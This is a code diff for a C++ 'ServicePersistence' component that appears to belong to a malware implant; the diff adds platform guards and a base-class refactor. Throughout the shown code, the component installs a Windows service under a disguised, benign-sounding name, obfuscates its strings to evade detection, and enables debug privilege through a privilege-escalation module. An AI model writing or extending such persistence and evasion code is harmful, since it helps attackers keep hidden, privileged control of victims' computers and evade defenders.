@@ -5,10 +5,12 @@
 #include "utils/FileUtils.h"
 #include "security/Obfuscation.h"
 #include "security/PrivilegeEscalation.h"
-#include <Windows.h>
 #include <string>
 #include <vector>
-#include <cstdint>
+
+#if PLATFORM_WINDOWS
+#include <Windows.h>
+#endif
 
 // Obfuscated strings
 constexpr auto OBF_SERVICE_PERSISTENCE = OBFUSCATE("ServicePersistence");
@@ -17,7 +19,7 @@ constexpr auto OBF_SERVICE_DISPLAY = OBFUSCATE("System Event Service");
 constexpr auto OBF_SERVICE_DESC = OBFUSCATE("Monitors system events and performance");
 
 ServicePersistence::ServicePersistence(Configuration* config)
-    : m_config(config), m_installed(false) {}
+    : BasePersistence(config) {}
 
 bool ServicePersistence::Install() {
     if (IsInstalled()) {
@@ -25,6 +27,7 @@ bool ServicePersistence::Install() {
         return true;
     }
 
+#if PLATFORM_WINDOWS
     if (!security::PrivilegeEscalation::EnablePrivilege(SE_DEBUG_NAME)) {
         LOG_WARN("Failed to enable debug privilege");
     }
@@ -88,9 +91,14 @@ bool ServicePersistence::Install() {
     m_installed = true;
     LOG_INFO("Service persistence installed successfully");
     return true;
+#else
+    LOG_WARN("Service persistence not supported on this platform");
+    return false;
+#endif
 }
 
 bool ServicePersistence::Remove() {
+#if PLATFORM_WINDOWS
     SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!scm) {
         LOG_ERROR("Failed to open Service Control Manager: " + std::to_string(GetLastError()));
@@ -119,9 +127,14 @@ bool ServicePersistence::Remove() {
     }
 
     return success;
+#else
+    LOG_WARN("Service persistence not supported on this platform");
+    return false;
+#endif
 }
 
 bool ServicePersistence::IsInstalled() const {
+#if PLATFORM_WINDOWS
     SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
     if (!scm) {
         return false;
@@ -136,9 +149,13 @@ bool ServicePersistence::IsInstalled() const {
 
     CloseServiceHandle(service);
     return true;
+#else
+    return false;
+#endif
 }
 
 bool ServicePersistence::StartService() {
+#if PLATFORM_WINDOWS
     SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
     if (!scm) {
         return false;
@@ -155,9 +172,13 @@ bool ServicePersistence::StartService() {
     CloseServiceHandle(scm);
 
     return success;
+#else
+    return false;
+#endif
 }
 
 bool ServicePersistence::StopService() {
+#if PLATFORM_WINDOWS
     SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
     if (!scm) {
         return false;
@@ -175,4 +196,7 @@ bool ServicePersistence::StopService() {
     CloseServiceHandle(scm);
 
     return success;
+#else
+    return false;
+#endif
 }
